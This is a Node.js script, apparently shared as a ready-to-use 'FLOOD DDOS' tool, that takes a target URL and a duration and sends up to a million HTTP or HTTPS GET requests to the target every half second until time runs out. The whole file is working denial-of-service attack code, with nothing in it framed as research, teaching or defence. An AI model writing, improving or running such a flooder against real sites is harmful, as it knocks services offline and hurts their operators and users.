const http = require('http');
const https = require('https');
const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const requestsPerInterval = 1000000;

if (process.argv.length < 4 || isNaN(duration)) {
    console.log('𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗙𝗟𝗢𝗢𝗗 𝗗𝗗𝗢𝗦\n\n— 𝖠𝗎𝗍𝗁𝗈𝗋: 𝖩𝖺𝗒 𝖬𝖺𝗋 & 𝖱𝗈𝗇𝖺\n(!) 𝖨𝗇𝗏𝖺𝗅𝗂𝖽 𝖴𝗌𝖺𝗀𝖾: 𝗇𝗈𝖽𝖾 𝖨𝗇𝖽𝖾𝗑.𝗃𝗌 <𝗅𝗂𝗇𝗄 𝗍𝖺𝗋𝗀𝖾𝗍> <𝖽𝗎𝗋𝖺𝗍𝗂𝗈𝗇 𝗂𝗇 𝗌𝖾𝖼𝗈𝗇𝖽𝗌>');
    process.exit(1);
} else {
    console.log(`🕓 Starting request bombardment to "${target}" for "${duration}" seconds...`);

    const protocol = target.startsWith('https') ? https : http;

    const attackInterval = setInterval(() => {
        for (let i = 0; i < requestsPerInterval; i++) {
            protocol.get(target, res => {
                console.log(`Request succeeded with status ${res.statusCode}`);
            }).on('error', err => {
                console.error(`Request failed: ${err.message}`);
            });
        }
    }, 500);

    setTimeout(() => {
        clearInterval(attackInterval);
        console.log('Request sending stopped.');
        process.exit(0);
    }, duration * 1000);
}
